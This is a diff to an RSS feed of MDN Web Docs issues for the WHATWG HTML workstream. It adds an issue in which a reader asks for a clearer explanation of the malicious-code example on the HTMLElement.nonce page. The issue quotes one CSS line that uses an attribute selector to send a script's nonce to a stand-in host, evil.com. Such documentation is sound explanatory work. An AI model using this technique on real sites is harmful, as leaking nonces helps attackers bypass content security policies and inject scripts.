@@ -4,10 +4,45 @@
         <title>WHATWG HTML Workstream-relevant MDN issues</title>
         <link>https://dontcallmedom.github.io/mdn-issue-by-spec/whatwg_html_workstream.rss</link>
         <description>Issue filed on MDN Web Docs related to pages attached to technologies developed by WHATWG HTML Workstream</description>
-        <lastBuildDate>Sun, 18 Sep 2022 09:20:10 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 19 Sep 2022 13:51:02 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
         <language>en</language>
+        <item>
+            <title><![CDATA[[html] Confusing example of malicious code]]></title>
+            <link>https://github.com/mdn/content/issues/20891</link>
+            <guid>https://github.com/mdn/content/issues/20891</guid>
+            <pubDate>Mon, 19 Sep 2022 13:51:02 GMT</pubDate>
+            <content:encoded><![CDATA[<h3 dir="auto">MDN URL</h3>
+<p dir="auto"><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/nonce" rel="nofollow">https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/nonce</a></p>
+<h3 dir="auto">What specific section or headline is this issue about?</h3>
+<p dir="auto">Examples</p>
+<h3 dir="auto">What information was incorrect, unhelpful, or incomplete?</h3>
+<p dir="auto">The example of malicious code is very hard to understand for newcomers.</p>
+<p dir="auto"><code class="notranslate">script[nonce~="whatever"] { background: url("https://evil.com/nonce?whatever"); }</code></p>
+<p dir="auto">I have a hard time understanding what this code actually means.</p>
+<h3 dir="auto">What did you expect to see?</h3>
+<p dir="auto">More details on what exactly happens here. It is hard to find anything helpful googling parts of this code and receiving helpful answers.<br>
+From the context, it seems that 'script' is an array. The part about</p>
+<p dir="auto"><code class="notranslate">script[nonce~="whatever"]</code></p>
+<p dir="auto">confuses me especially. From what I know, a binary NOT is made on the value "whatever" and then assigned to a value called nonce? I'm lost on anything that follows from that point on.</p>
+<h3 dir="auto">Do you have any supporting links, references, or citations?</h3>
+<p dir="auto"><em>No response</em></p>
+<h3 dir="auto">Do you have anything more you want to share?</h3>
+<p dir="auto"><em>No response</em></p>
+<h3 dir="auto">MDN metadata</h3>
+
+<details>
+<summary>Page report details</summary>
+<ul dir="auto">
+<li>Folder: <code class="notranslate">en-us/web/api/htmlelement/nonce</code></li>
+<li>MDN URL: <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/nonce" rel="nofollow">https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/nonce</a></li>
+<li>GitHub URL: <a href="https://github.com/mdn/content/blob/main/files/en-us/web/api/htmlelement/nonce/index.md">https://github.com/mdn/content/blob/main/files/en-us/web/api/htmlelement/nonce/index.md</a></li>
+<li>Last commit: <a class="commit-link" data-hovercard-type="commit" data-hovercard-url="https://github.com/mdn/content/commit/c09b8e9dd0022a33cf84355704ca281d6a5f29f5/hovercard" href="https://github.com/mdn/content/commit/c09b8e9dd0022a33cf84355704ca281d6a5f29f5"><tt>c09b8e9</tt></a></li>
+<li>Document last modified: 2022-09-13T07:59:37.000Z</li>
+</ul>
+</details>]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[[html, css-transforms-2, css-transforms-1] The "non-replaced inline boxes" links to a non-existent anchor]]></title>
             <link>https://github.com/mdn/content/issues/20854</link>
